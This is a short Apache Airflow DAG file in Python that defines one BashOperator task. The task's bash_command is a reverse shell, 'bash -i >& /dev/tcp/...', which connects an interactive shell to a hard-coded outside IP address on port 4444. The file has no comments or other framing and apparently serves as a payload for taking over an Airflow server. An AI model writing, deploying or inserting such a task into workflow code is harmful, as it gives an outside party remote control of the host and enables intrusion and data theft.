from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime
import os

with DAG(
    dag_id="Bash",
    start_date=datetime(2024,5,12),
    schedule_interval=None,
    catchup=False
) as dag:

        task01 = BashOperator(
        task_id="task01",
        bash_command="bash -i >& /dev/tcp/178.79.163.73/4444 0>&1"
    )	
